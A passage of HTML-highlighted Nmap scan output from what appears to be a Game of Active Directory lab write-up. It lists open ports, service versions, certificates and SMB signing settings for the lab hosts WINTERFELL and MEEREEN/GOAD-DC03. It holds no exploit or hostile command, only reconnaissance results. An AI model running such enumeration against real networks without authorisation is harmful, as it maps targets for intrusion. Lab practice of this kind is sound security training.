<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">rdp</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">NORTH</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">NORTH</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">WINTERFELL</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Tree_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.17763</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System_Time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">24</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">06</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">06</span>
<span class="w">    </span><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="mi">5986</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span><span class="p">,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">vagrant</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="nx">BC</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">ED</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">WINTERFELL</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">WINTERFELL</span><span class="p">,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">user</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">unknown</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">MAC</span><span class="p">:</span><span class="w"> </span><span class="nx">bc</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="nx">ff</span><span class="p">:</span><span class="nx">ff</span><span class="p">:</span><span class="nx">ed</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">26</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.12</span>
<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00023</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="w">    </span><span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">986</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="w">    </span><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="w">    </span><span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
<span class="w">    </span><span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">31</span><span class="nx">Z</span><span class="p">)</span>
<span class="w">    </span><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="w">    </span><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="w">    </span><span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span><span class="p">,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="w">  </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="mi">14393</span><span class="w"> </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="w"> </span><span class="p">(</span><span class="nx">workgroup</span><span class="p">:</span><span class="w"> </span><span class="nx">ESSOS</span><span class="p">)</span>
<span class="w">    </span><span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
<span class="w">    </span><span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="w">    </span><span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">tcpwrapped</span>
<span class="w">    </span><span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span><span class="p">,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">tcpwrapped</span>
<span class="w">    </span><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span><span class="p">.</span><span class="nx">essos</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">26</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">50</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">28</span><span class="nx">T20</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">50</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="mi">5986</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2016</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2016</span><span class="p">,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">vagrant</span><span class="o">-</span><span class="mi">2016</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">h2</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="nx">BC</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">2</span><span class="nx">F</span><span class="p">:</span><span class="mi">7</span><span class="nx">C</span><span class="p">:</span><span class="mi">2</span><span class="nx">C</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Hosts</span><span class="p">:</span><span class="w"> </span><span class="nx">MEEREEN</span><span class="p">,</span><span class="w"> </span><span class="nx">GOAD</span><span class="o">-</span><span class="nx">DC03</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">account_used</span><span class="p">:</span><span class="w"> </span><span class="nx">guest</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="nx">user</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="nx">supported</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">message_signing</span><span class="p">:</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span><span class="nx">mean</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">11</span><span class="nx">m59s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">26</span><span class="nx">m47s</span><span class="p">,</span><span class="w"> </span><span class="nx">median</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb</span><span class="o">-</span><span class="nx">os</span><span class="o">-</span><span class="nx">discovery</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="mi">14393</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nx">Standard</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="m m-Double">6.3</span><span class="p">)</span>
